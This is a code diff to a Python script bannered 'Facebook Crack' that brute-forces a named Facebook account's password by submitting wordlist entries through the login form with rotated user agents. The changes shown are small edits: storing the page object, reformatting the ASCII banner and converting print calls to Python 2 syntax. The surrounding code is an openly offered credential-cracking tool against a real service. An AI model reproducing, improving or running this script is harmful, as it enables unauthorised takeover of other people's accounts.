@@ -40,7 +40,7 @@ def brute(password):
 	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
 	sys.stdout.flush()
 	br.addheaders = [('User-agent', random.choice(useragents))]
-	br.open(login,"user")
+	site=br.open(login,"user")
 	br.select_form(nr = 0)
 	br.form['email'] = email
 	br.form['pass'] = password
@@ -67,19 +67,18 @@ def welcome():
         |..........   Facebook Crack   ...........|
         +-----------------------------------------+
         |         #Author: R@HU1 G@VH@N3          | 
-        |	        Version 1.0                   |
- 	    |        N0thing_i5_imp055ibl63.          |
+        |	        Version 1.0               |
+ 	|        N0thing_i5_imp055ibl63.          |
         +=========================================+
         |..........  Facebook Cracker  ...........|
         +-----------------------------------------+\n\n
 """
 	total = open(passwordlist,"r")
 	total = total.readlines()
-	print (wel) 
-	print (" [*] Account to crack : {}".format(email))
-	print (" [*] Loaded :" , len(total), "passwords")
-	print (" [*] Cracking, please wait ...\n\n")
-
+	print wel
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
 	
 if __name__ == '__main__':
 	main()
